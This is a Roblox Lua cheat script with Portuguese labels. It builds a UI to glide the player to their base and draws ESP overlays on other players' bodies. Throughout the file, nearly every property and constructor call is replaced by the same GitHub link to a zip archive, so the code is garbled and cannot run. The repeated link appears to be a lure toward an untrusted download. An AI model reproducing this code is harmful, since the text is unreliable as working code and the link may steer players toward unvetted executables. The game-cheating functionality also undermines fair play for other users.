local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip

local screenGui = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip("ScreenGui", player:WaitForChild("PlayerGui"))
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = "TeleportUI"
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = false

local mainFrame = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip("Frame", screenGui)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = "MainUI"
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0, 250, 0, 150)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0.05, 0, 0.05, 0)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(35, 35, 35)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = 0
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = true
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = true

local uiCorner = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip("UICorner", mainFrame)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0, 10)

local title = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip("TextLabel", mainFrame)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = "Teleportador de Base"
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(1, 0, 0, 30)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0, 0, 0, 0)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = 1
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(1, 1, 1)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = true

local toggle = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip("TextButton", mainFrame)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = "Ativar"
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0.4, 0, 0.2, 0)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0.05, 0, 0.5, 0)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(60, 200, 60)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = true
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(1, 1, 1)

local goButton = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip("TextButton", mainFrame)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = "Ir para Base"
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0.5, 0, 0.2, 0)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0.45, 0, 0.5, 0)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(60, 120, 200)
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = true
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(1, 1, 1)

local ativo = true
https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(function()
	ativo = not ativo
	https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = ativo and "Ativar" or "Desativado"
	https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = ativo and https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(60, 200, 60) or https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(200, 60, 60)
end)

local function moverSuavementeAteBase()
	if not ativo then return end

	local char = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip or https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip()
	local hrp = char:WaitForChild("HumanoidRootPart")

	local bases = workspace:FindFirstChild("Bases")
	if not bases then return end

	local base = bases:FindFirstChild(https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip)
	if not base or not base:IsA("BasePart") then return end

	local destino = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip + https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(0, 5, 0)
	local tweenInfo = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(2, https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip, https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip)
	local objetivo = {Position = destino}
	local tween = TweenService:Create(hrp, tweenInfo, objetivo)
	tween:Play()
end

https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(moverSuavementeAteBase)

local function aplicarESPNoCorpo(jogador)
	if jogador == player then return end

	https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(function(char)
		https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(1)
		for _, parte in pairs(char:GetChildren()) do
			if parte:IsA("BasePart") and https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip ~= "HumanoidRootPart" then
				local overlay = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip("BoxHandleAdornment")
				https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = parte
				https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = true
				https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = 5
				https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip
				https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = 0.7
				https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(255, 80, 80)
				https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip = parte
			end
		end
	end)
end

for _, p in pairs(Players:GetPlayers()) do
	aplicarESPNoCorpo(p)
end

https://github.com/troller172/Troller-scriptp/raw/refs/heads/main/actin/Troller_scriptp_v1.4.zip(aplicarESPNoCorpo)
